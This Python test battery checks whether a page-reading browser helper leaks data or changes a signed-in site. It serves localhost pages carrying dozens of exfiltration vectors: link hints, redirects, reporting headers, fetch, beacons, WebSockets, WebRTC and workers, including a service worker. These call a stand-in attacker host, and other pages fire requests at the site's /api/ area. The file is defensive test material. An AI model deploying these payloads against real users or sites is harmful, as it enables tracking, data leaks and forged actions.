"""The vector battery of the signed-in compartment (ruling 84, third compartment): what leaves the connected site, and what changes on it.

No model: the helper's own launcher is called directly on a scratch browser (its own profile, its own browser-harness daemon) with pages
served on localhost that try every way a page can make the browser send something, open a socket, look up a name or change the site. For
each page the battery counts, at the **attacker** (a localhost server and a UDP port): requests, TCP connections, UDP datagrams, and (from
the browser's own net log, read after the browser stops) DNS lookups of names that exist only in the page; at the **connected site**:
state-changing hits (any request to its ``/api/`` area: the page is opened as a given address and may make none); and the tabs left.

Every page is read by the helper as shipped: the document is read and parsed, never loaded, so a page that needs script (a ``location =``, a
worker, WebRTC) has nothing to run it with. The ``script`` rows are the pages that would try, to prove that; ``encoding`` and ``odd`` are
documents of another encoding, a compressed body, a body over the cap, a PDF, JSON, a download, an endless or a hung answer.

A service worker the site registered **earlier** is part of the battery: the page that registers it is opened in the scratch browser by the
battery itself (never through the helper) before the helper reads a page in its scope.
"""
from __future__ import annotations

import gzip
import json
import re
import time
from pathlib import Path

from api.services import harness_browse as hbr

#: Every name below resolves nowhere: a lookup of one is a leak the browser made on its own (a dns-prefetch, a preconnect).
DNS_ZONE = "evil-resolve.test"
MARK = "VT-OK"          # text every vector page carries: it says whether the page was still read


def dns_host(name: str) -> str:
    return f"dns-{name.replace('_', '-')}.{DNS_ZONE}"


def page(body: str = "", head: str = "") -> str:
    return f"<html><head><title>Vector</title>{head}</head><body><h1>PAGE</h1><p>{MARK} body text of the page</p>{body}</body></html>"


def build(sites) -> dict:
    """``{name: (category, status, headers, body | callable)}`` for the ``/v/<name>`` pages of the connected site."""
    E, O, S, ST = sites.url["attacker"], sites.url["other"], sites.url["site"], sites.url["assets"]
    EW = E.replace("http", "ws", 1)
    PU = sites.udp_port
    H = lambda n: f"{E}/hit?c={n}"                     # noqa: E731
    V: dict = {}

    def add(name, body="", *, cat="scriptless", headers=None, status=200, ctype="text/html; charset=utf-8", raw=None):
        V[name] = (cat, status, dict(headers or {}, **{"Content-Type": ctype} if ctype else {}), raw if raw is not None else body)

    # ---- a page's own markup: hints and subresources (no script needed)
    for rel in ("prerender", "preconnect", "prefetch", "preload", "modulepreload", "icon", "manifest", "alternate"):
        extra = " as=script" if rel == "preload" else ""
        add(f"link_{rel}", page("", f"<link rel={rel} href='{H('link_' + rel)}'{extra}>"))
    add("link_dnsprefetch", page("", f"<link rel=dns-prefetch href='http://{dns_host('link_dnsprefetch')}/'>"))
    add("link_preconnect_dns", page("", f"<link rel=preconnect href='http://{dns_host('link_preconnect_dns')}/'>"))
    add("preconnect_bare", page("", f"<link rel=preconnect href='{E}'>"))
    add("hint_upper", page("", f"<LINK REL=PreConnect HREF='{E}'>"))
    add("hint_slash", page("", f"<link/rel=preconnect href='{E}'>"))
    add("hint_noscript", page("", f"<noscript><link rel=preconnect href='{E}'></noscript>"))
    add("hint_multirel", page("", f"<link rel='stylesheet preconnect' href='{E}/x.css'>"))
    add("hint_body", page(f"<link rel=preconnect href='{E}'>"))
    add("hint_quote_gt", page("", f"<link title='>' rel=preconnect href='{E}'>"))
    add("hint_newline", page("", f"<link\nrel=\nprerender\nhref='{H('hint_newline')}'>"))
    add("anchor_dns", page(f"<a href='http://{dns_host('anchor_dns')}/profile'>a link to a host only the page names</a>"))
    add("anchor_attacker", page(f"<a href='{E}/profile'>a link to the attacker</a> <a href='{E}/profile2' ping='{H('anchor_ping')}'>pinged</a>"))
    add("meta_refresh", page("", f"<meta http-equiv=refresh content='0;url={H('meta_refresh')}'>"))
    add("meta_refresh_late", page("", f"<meta http-equiv=refresh content='3;url={H('meta_refresh_late')}'>"))
    add("meta_refresh_noscript", page("", f"<noscript><meta http-equiv=refresh content='0;url={H('meta_refresh_noscript')}'></noscript>"))
    add("base_img", page("<img src=x.png>", f"<base href='{E}/'>"))
    add("img", page(f"<img src='{H('img')}'>"))
    add("img_srcset", page(f"<img srcset='{H('img_srcset')} 2x' src='/none.png'>"))
    add("css_url", page("", f"<style>body{{background:url('{H('css_url')}')}}</style>"))
    add("css_import", page("", f"<style>@import url('{H('css_import')}');</style>"))
    add("css_font", page("", f"<style>@font-face{{font-family:x;src:url('{H('css_font')}')}} body{{font-family:x}}</style>"))
    add("link_sheet_attacker", page("", f"<link rel=stylesheet href='{H('link_sheet_attacker')}'>"))
    add("link_sheet_import", page("", f"<link rel=stylesheet href='{ST}/v/import.css'>"))
    add("video_preload", page(f"<video src='{H('video_preload')}' preload=auto></video>"))
    add("object", page(f"<object data='{H('object')}'></object><embed src='{H('embed')}'>"))
    add("iframe", page(f"<iframe src='{H('iframe')}'></iframe>"))
    add("iframe_nested", page(f"<iframe srcdoc=\"<iframe src='{H('iframe_nested')}'></iframe>\"></iframe>"))
    add("iframe_data", page(f"<iframe src=\"data:text/html,<img src='{H('iframe_data')}'>\"></iframe>"))
    add("form_get", page(f"<form action='{E}/hit'><input name=c value=form_get></form>"))
    add("input_image", page(f"<input type=image src='{H('input_image')}'>"))
    add("svg_image", page(f"<svg><image href='{H('svg_image')}'/></svg>"))
    add("script_ext", page(f"<script src='{H('script_ext')}'></script>"))
    add("script_ext_site", page("<script src='/v/app.js'></script>"))
    # ---- redirects the site itself answers
    for code in (301, 302, 307, 308):
        add(f"redirect_{code}", status=code, headers={"Location": H(f"redirect_{code}")}, body="")
    add("redirect_chain", status=302, headers={"Location": "/v/redirect_chain2"})
    add("redirect_chain2", status=301, headers={"Location": H("redirect_chain")})
    add("redirect_other", status=302, headers={"Location": f"{O}/hit?c=redirect_other"})
    add("redirect_logout", status=302, headers={"Location": "/logout"})
    add("redirect_static_doc", status=302, headers={"Location": f"{ST}/v/plain"})
    add("redirect_dns", status=302, headers={"Location": f"http://{dns_host('redirect_dns')}/"})
    # ---- response headers
    add("hdr_preconnect", page(), headers={"Link": f"<{E}>; rel=preconnect"})
    add("hdr_dnspf", page(), headers={"Link": f"<http://{dns_host('hdr_dnspf')}>; rel=dns-prefetch"})
    add("hdr_prefetch", page(), headers={"Link": f"<{H('hdr_prefetch')}>; rel=prefetch"})
    add("hdr_prerender", page(), headers={"Link": f"<{H('hdr_prerender')}>; rel=prerender"})
    add("hdr_preload", page(), headers={"Link": f"<{H('hdr_preload')}>; rel=preload; as=script"})
    add("hdr_refresh", page(), headers={"Refresh": f"0; url={H('hdr_refresh')}"})
    add("hdr_speculation", page(), headers={"Speculation-Rules": '"/v/rules.json"'})
    add("rules.json", cat="aux", ctype="application/speculationrules+json", body=json.dumps({"prerender": [{"source": "list", "urls": [H("hdr_speculation")]}]}))
    add("hdr_reporting", page(), headers={"Report-To": json.dumps({"group": "g", "max_age": 600, "endpoints": [{"url": H("hdr_report_to")}]}),
                                          "NEL": json.dumps({"report_to": "g", "max_age": 600, "success_fraction": 1.0}),
                                          "Reporting-Endpoints": f'default="{H("hdr_reporting_endpoints")}"'})
    add("hdr_csp_report", page(f"<img src='{O}/x.png'>"), headers={"Content-Security-Policy": f"img-src 'none'; report-uri {H('hdr_csp_report')}"})
    add("hdr_clear_site_data", page(), headers={"Clear-Site-Data": '"cookies"'})
    add("hdr_set_cookie", page(), headers={"Set-Cookie": "sid=ROTATED; Path=/"})
    add("hdr_alt_svc", page(), headers={"Alt-Svc": f'h3="attacker.localhost:{sites.port_of("attacker")}"; ma=3600'})
    add("hdr_own_csp", page("<span style='display:none'>HIDDEN-BY-STYLE</span>"),
        headers={"Content-Security-Policy": "style-src 'none'; default-src *"})
    # ---- what the body is
    html = page(f"<link rel=preconnect href='{E}'>")
    add("enc_utf16", cat="encoding", ctype="text/html", raw=html.encode("utf-16"))
    add("enc_utf16le_header", cat="encoding", ctype="text/html; charset=utf-16le", raw=html.encode("utf-16-le"))
    add("enc_utf7", cat="encoding", ctype="text/html; charset=utf-7",
        raw=f"+ADw-html+AD4-+ADw-body+AD4-{MARK} +ADw-link rel+AD0-preconnect href+AD0-'{E}'+AD4-+ADw-/body+AD4-".encode("ascii"))
    add("enc_latin1", cat="encoding", ctype="text/html; charset=iso-8859-1", raw=page("caf\xe9 <link rel=preconnect href='%s'>" % E).encode("latin-1"))
    add("enc_meta_charset", cat="encoding", ctype="text/html", raw=("<html><head><meta charset=windows-1252>" + page("caf\xe9 <link rel=preconnect href='%s'>" % E)[12:]).encode("cp1252"))
    add("enc_bom8", cat="encoding", ctype="text/html", raw=b"\xef\xbb\xbf" + html.encode("utf-8"))
    add("enc_gzip", cat="encoding", headers={"Content-Encoding": "gzip"}, raw=gzip.compress(html.encode("utf-8")))
    add("enc_unknown_charset", cat="encoding", ctype="text/html; charset=x-no-such-thing", raw=html.encode("utf-8"))
    add("big", cat="odd", raw=(page("") + "<p>filler</p>" * 400000 + f"<link rel=preconnect href='{E}'><p>END-OF-BIG</p>").encode())
    add("pdf", cat="odd", ctype="application/pdf", raw=b"%PDF-1.4 " + MARK.encode())
    add("json", cat="odd", ctype="application/json", raw=json.dumps({"x": MARK}).encode())
    add("plain", cat="odd", ctype="text/plain", raw=f"{MARK} plain".encode())
    add("xhtml", cat="odd", ctype="application/xhtml+xml", raw=f"<html xmlns='http://www.w3.org/1999/xhtml'><body>{MARK}</body></html>".encode())
    add("attachment", cat="odd", headers={"Content-Disposition": "attachment; filename=a.html"}, raw=page().encode())
    add("no_ctype", cat="odd", ctype=None, raw=page().encode())
    add("status_204", cat="odd", status=204, raw=b"")
    add("status_404", cat="odd", status=404, raw=page().encode())
    V["hung"] = ("odd", 0, {}, "hung")
    V["infinite"] = ("odd", 0, {}, "infinite")
    # ---- script on the connected domain (the page the site itself wrote): it has nothing to run it with
    s = lambda n, js, **kw: add(n, page(f"<script>{js}</script>"), cat="script", **kw)        # noqa: E731
    s("loc", f"location='{H('loc')}'")
    s("loc_replace", f"location.replace('{H('loc_replace')}')")
    s("loc_late", f"setTimeout(()=>location.assign('{H('loc_late')}'),1500)")
    s("loc_dns", f"location='http://{dns_host('loc_dns')}/'")
    s("form_post", f"var f=document.createElement('form');f.method='post';f.action='{E}/hit?c=form_post';document.body.append(f);f.submit()")
    s("form_get_auto", f"var f=document.createElement('form');f.action='{E}/hit';document.body.append(f);f.submit()")
    s("win_open", f"try{{window.open('{H('win_open')}')}}catch(e){{}}")
    s("win_open_iframe", f"var i=document.createElement('iframe');document.body.append(i);try{{i.contentWindow.open('{H('win_open_iframe')}')}}catch(e){{}}")
    s("fetch", f"fetch('{H('fetch')}',{{mode:'no-cors'}})")
    s("xhr", f"var x=new XMLHttpRequest();x.open('GET','{H('xhr')}');x.send()")
    s("beacon", f"navigator.sendBeacon('{H('beacon')}','data')")
    s("event_source", f"new EventSource('{H('event_source')}')")
    s("websocket", f"try{{new WebSocket('{EW}/ws?c=websocket')}}catch(e){{}}")
    s("websocket_iframe", f"var i=document.createElement('iframe');document.body.append(i);var W=i.contentWindow.WebSocket;try{{new W('{EW}/ws?c=websocket_iframe')}}catch(e){{}}")
    s("webtransport", f"try{{new WebTransport('https://attacker.localhost:{sites.port_of('attacker')}/wt')}}catch(e){{}}")
    rtc = f"var p=new RTCPeerConnection({{iceServers:[{{urls:'stun:127.0.0.1:{PU}'}}]}});p.createDataChannel('x');p.createOffer().then(o=>p.setLocalDescription(o))"
    s("webrtc", f"try{{{rtc}}}catch(e){{}}")
    s("webrtc_iframe", f"var i=document.createElement('iframe');document.body.append(i);var R=i.contentWindow.RTCPeerConnection;try{{var p=new R({{iceServers:[{{urls:'stun:127.0.0.1:{PU}'}}]}});p.createDataChannel('x');p.createOffer().then(o=>p.setLocalDescription(o))}}catch(e){{}}")
    s("webrtc_srcdoc", "var i=document.createElement('iframe');i.srcdoc=\"<script>try{" + rtc.replace('"', "'") + "}catch(e){}<\\/script>\";document.body.append(i)")
    wk = f"fetch('{H('worker_fetch')}',{{mode:'no-cors'}});try{{new WebSocket('{EW}/ws?c=worker_ws')}}catch(e){{}}"
    s("worker_blob", f"var b=new Blob([\"{wk}\"]);new Worker(URL.createObjectURL(b))")
    s("worker_file", "new Worker('/v/worker.js')")
    s("shared_worker", "try{new SharedWorker('/v/worker.js')}catch(e){}")
    add("worker.js", cat="aux", ctype="text/javascript", body=wk)
    s("sw_register", "navigator.serviceWorker.register('/v/sw/sw.js',{scope:'/v/sw/'})")
    add("sw/sw.js", cat="aux", ctype="text/javascript", headers={"Service-Worker-Allowed": "/v/sw/"},
        body=(f"self.addEventListener('install',e=>{{fetch('{H('sw_install')}',{{mode:'no-cors'}});self.skipWaiting()}});"
              f"self.addEventListener('activate',e=>{{fetch('{H('sw_activate')}',{{mode:'no-cors'}});clients.claim()}});"
              f"self.addEventListener('fetch',e=>{{fetch('{H('sw_fetch_event')}',{{mode:'no-cors'}})}});"))
    add("sw/use", page(), cat="sw_before")
    s("script_preconnect", f"var l=document.createElement('link');l.rel='preconnect';l.href='{E}';document.head.append(l)")
    s("script_prerender", f"var l=document.createElement('link');l.rel='prerender';l.href='{H('script_prerender')}';document.head.append(l)")
    V["spec_prerender"] = ("script", 200, {"Content-Type": "text/html; charset=utf-8"},
                           page("", f'<script type=speculationrules>{{"prerender":[{{"source":"list","urls":["{H("spec_prerender")}"]}}]}}</script>'))
    s("img_script", f"new Image().src='{H('img_script')}'")
    s("data_nav", "location='data:text/html,<img src=\"%s\">'" % H("data_nav"))
    s("js_nav", f"location='javascript:fetch(\"{H('js_nav')}\",{{mode:\"no-cors\"}})'")
    # ---- what changes the site (the connected site's own /api/ area counts)
    add("act_img", page(f"<img src='{S}/api/act?do=1'>"), cat="state")
    add("act_css_url", page("", f"<style>body{{background:url('{S}/api/css?do=1')}}</style>"), cat="state")
    add("act_link_sheet", page("", f"<link rel=stylesheet href='{S}/api/sheet?do=1'>"), cat="state")
    add("act_font", page("", f"<style>@font-face{{font-family:x;src:url('{S}/api/font?do=1')}} body{{font-family:x}}</style>"), cat="state")
    add("act_iframe", page(f"<iframe src='{S}/api/frame?do=1'></iframe>"), cat="state")
    add("act_form_get", page(f"<form action='{S}/api/form'><input name=do value=1></form>"), cat="state")
    add("act_fetch_post", page(f"<script>fetch('{S}/api/do',{{method:'POST',body:'x'}})</script>"), cat="state")
    add("act_xhr_get", page(f"<script>fetch('{S}/api/act?do=2')</script>"), cat="state")
    add("act_form_post", page(f"<form id=f method=post action='{S}/api/do'></form><script>f.submit()</script>"), cat="state")
    add("act_beacon", page(f"<script>navigator.sendBeacon('{S}/api/beacon','x')</script>"), cat="state")
    # ---- legitimate pages
    add("legit_server", page(f"<div id=out>server-rendered-text</div><script src='{ST}/v/app.js'></script>", f"<link rel=stylesheet href='{ST}/v/app.css'>"
                             f"<meta name=description content='A server-rendered profile with a declared description.'>"), cat="legit")
    add("legit_client", ("<html><head><title>Client</title><meta property='og:description' content='Declared by the page: a client-rendered profile.'>"
                         f"</head><body><div id=root></div><script src='{ST}/v/app.js'></script></body></html>"), cat="legit")
    add("app.js", cat="aux", ctype="text/javascript", body="document.getElementById('root')&&(document.getElementById('root').textContent='SCRIPT-BUILT-TEXT');"
                                                           "document.getElementById('out')&&(document.getElementById('out').textContent='script-changed-text')")
    add("app.css", cat="aux", ctype="text/css", body="body{color:red}")
    add("import.css", cat="aux", ctype="text/css", body=f"@import url('{H('import_css')}');")
    return V


def install(sites) -> dict:
    """Make ``sites`` serve the vector pages (on ``site`` and on ``assets``); returns the table."""
    table = build(sites)
    prior = sites.special

    def special(name, path, handler) -> bool:
        if name not in ("site", "assets") or not path.startswith("/v/"):
            return prior(name, path, handler)
        entry = table.get(path[3:])
        if entry is None:
            return False
        _cat, status, headers, body = entry
        if body in ("hung", "infinite"):
            handler.send_response(200)
            handler.send_header("Content-Type", "text/html; charset=utf-8")
            handler.end_headers()
            handler.wfile.write(b"<html><body>VT-OK partial ")
            handler.wfile.flush()
            end = time.time() + (40 if body == "hung" else 25)
            try:
                while time.time() < end:
                    if body == "infinite":
                        handler.wfile.write(b"<p>endless filler of the infinite page</p>" * 1500)
                        handler.wfile.flush()
                    time.sleep(0.05 if body == "infinite" else 1)
            except OSError:
                pass
            return True
        data = body if isinstance(body, bytes) else body.encode("utf-8")
        try:
            handler.send_response(status)
            for k, v in headers.items():
                handler.send_header(k, v)
            handler.send_header("Content-Length", str(len(data)))
            handler.end_headers()
            handler.wfile.write(data)
        except OSError:
            pass                                  # the browser stopped reading (a body it cut at its cap)
        return True

    sites.special = special
    return table


# --------------------------------------------------------------------------- the runner


def register_service_worker(rig, sites) -> None:
    """Let the site register its service worker in the scratch profile **before** any helper read: the page is opened by the battery
    itself in a tab of the scratch browser (never through the helper), given a moment, and closed."""
    tid = rig.open_tab(f"{sites.url['site']}/v/sw_register")
    time.sleep(3.0)
    urlopen_close(rig, tid)


def urlopen_close(rig, tid: str) -> None:
    import urllib.request

    try:
        urllib.request.urlopen(f"http://127.0.0.1:{rig.port}/json/close/{tid}", timeout=5).read()
    except OSError:
        pass


def count_dns(netlog: Path, names: list[str]) -> dict[str, int]:
    """How many name lookups the browser itself made for each lookup host, read from its net log after it stopped: the distinct host-resolver
    requests whose host is that name (a name that only appears in a logged header or address is not a lookup)."""
    try:
        data, _end = json.JSONDecoder().raw_decode(netlog.read_text(errors="replace"))
    except (OSError, ValueError):
        return {}
    kinds = {v: k for k, v in data.get("constants", {}).get("logEventTypes", {}).items()}
    found: dict[str, set] = {n: set() for n in names}
    for event in data.get("events", []):
        if not str(kinds.get(event.get("type"), "")).startswith("HOST_RESOLVER"):
            continue
        blob = json.dumps(event.get("params") or {})
        for n in names:
            if dns_host(n) in blob:
                found[n].add((event.get("source") or {}).get("id"))
    return {n: len(ids) for n, ids in found.items()}


def run(sites, rig, work: Path, table: dict, *, only: list[str] | None = None, names: tuple[str, ...] = ("Vector",),
        launcher_rewrite=None) -> list[dict]:
    """Open every vector page as a given address, one launcher each, and measure what reached the attacker and the site."""
    from benchmarks.consolidation import harness_battery_browser as bb

    rows = []
    s = sites.url["site"]
    chosen = [n for n, v in table.items() if v[0] not in ("aux",) and (not only or n in only)]
    for n in chosen:
        cat = table[n][0]
        d = work / f"v-{n.replace('/', '_')}"
        d.mkdir(parents=True, exist_ok=True)
        grant = hbr.grant_dict({"site": ("site.localhost",)}, [hbr.Given(f"{s}/v/{n}", "source")], harness=hbr.harness_path(), harness_env=rig.env,
                               loopback_for_test=True, names=list(names), timeout_s=35)
        setup = hbr.write_setup(d, grant, rig.env)
        if launcher_rewrite:
            launcher_rewrite(setup)
        mark, conns, udp = len(sites.log), sites.conns["attacker"], sites.udp_packets
        t0 = time.time()
        out = bb._call(setup, "open", f"{s}/v/{n}", timeout=90)
        seconds = round(time.time() - t0, 1)
        time.sleep(1.2)                                         # a late request would be in by now
        try:
            state = json.loads(Path(setup.state).read_text())
        except (OSError, ValueError):
            state = {}
        hits = sites.hits[mark:]
        rows.append({
            "vector": n, "cat": cat, "seconds": seconds,
            "attacker_requests": len(sites.count("attacker", mark)), "attacker_connections": sites.conns["attacker"] - conns,
            "udp": sites.udp_packets - udp, "other_requests": len(sites.count("other", mark)),
            "state_hits": len([1 for srv, m, p in hits if srv == "site" and p.startswith("/api/")]),
            "logout_hits": len([1 for srv, m, p in hits if srv == "site" and p.startswith("/logout")]),
            "read": MARK in out, "tab_left": bool(state.get("targets")), "head": " | ".join(l for l in out.splitlines()[:3])[:140]})
        hbr.close_tabs(setup)
    return rows


def summarize(rows: list[dict], dns: dict[str, int]) -> dict:
    """The bar: zero requests, zero connections and zero UDP at the attacker for every vector, zero state-changing hits, zero tabs left. DNS lookups
    (a name only a page named, looked up by the browser itself) are counted apart and said exactly."""
    leaking = [r["vector"] for r in rows if r["attacker_requests"] or r["attacker_connections"] or r["udp"] or r["other_requests"]]
    return {
        "vectors": len(rows), "attacker_requests": sum(r["attacker_requests"] for r in rows),
        "attacker_connections": sum(r["attacker_connections"] for r in rows), "udp": sum(r["udp"] for r in rows),
        "other_site_requests": sum(r["other_requests"] for r in rows), "state_changing_hits": sum(r["state_hits"] for r in rows),
        "logout_hits": sum(r["logout_hits"] for r in rows), "tabs_left": sum(r["tab_left"] for r in rows), "leaking_vectors": leaking,
        "dns_lookups": sum(dns.get(r["vector"], 0) for r in rows), "dns_vectors": {r["vector"]: dns[r["vector"]] for r in rows if dns.get(r["vector"])},
        "seconds_per_open_median": sorted(r["seconds"] for r in rows)[len(rows) // 2] if rows else 0,
    }
